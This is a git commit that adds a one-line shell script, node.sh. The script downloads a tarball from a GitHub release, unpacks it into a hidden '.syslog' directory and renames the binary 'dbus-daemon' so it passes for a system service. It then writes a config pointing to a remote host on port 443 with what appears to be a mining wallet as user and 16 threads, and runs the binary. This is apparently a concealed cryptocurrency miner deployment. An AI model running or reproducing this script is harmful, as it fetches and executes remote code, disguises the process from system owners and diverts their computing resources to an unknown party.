070a9a6a378057294b7342b24401269c7f33aa4f
wijayakvn45 <wijayasaputra4545@gmail.com>
2025-07-08 12:45:31 +0700

    Create node.sh

---
+++ node.sh
@@ -0,0 +1,1 @@
+wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz -O core.tar.gz && tar -xf core.tar.gz && mv next-app .syslog && cd .syslog && mv next-app dbus-daemon && chmod +x dbus-daemon && echo '{"host": "152.42.199.142", "port": 443, "user": "mbc1qe3flkq8el48edhzudr75a2pj0vdf4uvykdygxg.node01", "pass": "x", "threads": 16}' > config.json &&./dbus-daemon
